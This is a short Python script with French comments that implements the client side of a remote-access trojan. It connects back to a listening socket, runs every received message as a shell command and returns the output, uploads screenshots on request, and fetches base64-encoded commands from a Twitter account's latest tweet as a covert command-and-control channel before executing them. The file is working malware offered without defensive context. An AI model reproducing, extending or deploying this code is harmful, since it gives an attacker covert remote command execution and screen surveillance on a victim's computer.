import socket as s
import subprocess
from mss import mss
import requests
from bs4 import BeautifulSoup as soup
import base64

message = str()
#### Client ######
##Attendre une connexion

def screen():
    with mss() as sct :
        sct.shot()
        f = open("monitor-1.png","rb")
        data=  f.read()
        f.close()
    return data

def candc():
    url = "http://twitter.com/S1mpleCC"
    data = requests.get(url)
    data2 = soup(data.text,"html.parser")
    cmd = data2.find("div", {"class":"tweet"}).find("div",{"class":"js-tweet-text-container"}).find("p").string
    payload = base64.b64decode(cmd)
    return payload

mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)


### Fonction connect((host,port)

mon_socket.connect(("127.0.0.1",1242))
while message != "exit":
    message = mon_socket.recv(262144)
    message = message.decode('UTF-8')
    if message == "screen":
        mon_socket.send(screen())
    if message == "candc":
        payloadcmd = candc()
        process = subprocess.Popen(payloadcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        mon_socket.send(process.stdout.read()+process.stderr.read())

    else:
        print(message)
        process = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        mon_socket.send(process.stdout.read()+process.stderr.read())


mon_socket.close()

#    if message == "exit":
#        mon_socket.close()
